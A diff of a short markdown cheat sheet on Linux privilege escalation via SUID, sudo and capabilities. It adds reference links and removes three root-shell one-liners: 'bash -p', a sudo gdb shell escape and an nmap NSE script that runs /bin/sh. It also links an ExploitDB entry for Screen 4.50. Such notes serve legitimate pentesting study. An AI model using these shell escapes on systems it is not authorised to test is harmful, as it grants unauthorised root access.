@@ -1,17 +1,17 @@
 # Linux - CapSuidSudo
 
+All of this is for unique suid, sudo or capabilities. You can check the references below for more good site for this :)
+
+- [Capabilities](#capabilities)
+- [Suid](#suid)
+- [Sudo](#sudo)
+- [References](#references)
+
 # Capabilities
 
 # SUID
 
-- [Bash](#bash)
 - [Screen4.50](#screen450)
-
-### Bash
-
-```
-bash -p
-```
 
 ### Screen4.50
 
@@ -84,17 +84,10 @@ Link => [ExploitDB-41154](https://www.exploit-db.com/exploits/41154)
 
 # Sudo
 
-- [Gdb](#gdb)
-- [Nmap](#nmap)
 
-## GDB
+# References
+[1] https://gtfobins.github.io/
 
-```
-sudo /usr/bin/gdb -nx -ex '!sh' -ex quit
-```
+[2] https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
 
-## Nmap
-
-```
-echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
-```
+[3] https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
